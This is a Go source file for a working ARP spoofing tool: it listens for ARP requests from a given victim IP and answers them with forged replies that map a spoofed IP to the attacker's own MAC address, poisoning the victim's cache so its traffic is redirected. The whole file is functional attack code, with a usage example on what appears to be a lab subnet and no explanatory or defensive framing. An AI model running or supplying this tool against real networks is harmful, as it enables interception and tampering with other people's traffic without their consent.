//go:build passive

package main

import (
	"fmt"
	"os"

	"github.com/mdlayher/arp"
)

func run(ifname, victimIPStr, spoofedIPStr string) error {
	iface, myIP, err := getInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	victimIP, err := parseIPv4(victimIPStr)
	if err != nil {
		return err
	}
	spoofedIP, err := parseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	client, err := arp.Dial(iface)
	if err != nil {
		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
	}
	defer client.Close()

	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP : %s\n", myIP)
	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIP, spoofedIP)
	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)

	for {
		packet, _, err := client.Read()
		if err != nil {
			return fmt.Errorf("read ARP packet: %w", err)
		}
		if packet.Operation != arp.OperationRequest {
			continue
		}
		if packet.SenderIP != victimIP || packet.TargetIP != spoofedIP {
			continue
		}

		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, packet.SenderIP, packet.SenderHardwareAddr)

		if err := client.Reply(packet, iface.HardwareAddr, spoofedIP); err != nil {
			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
			continue
		}
		fmt.Printf("[+] Sent ARP reply: %s is at %s\n", spoofedIP, iface.HardwareAddr)
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: sudo %s eth0 192.168.56.101 192.168.56.1\n", os.Args[0])
		os.Exit(1)
	}

	if err := run(os.Args[1], os.Args[2], os.Args[3]); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
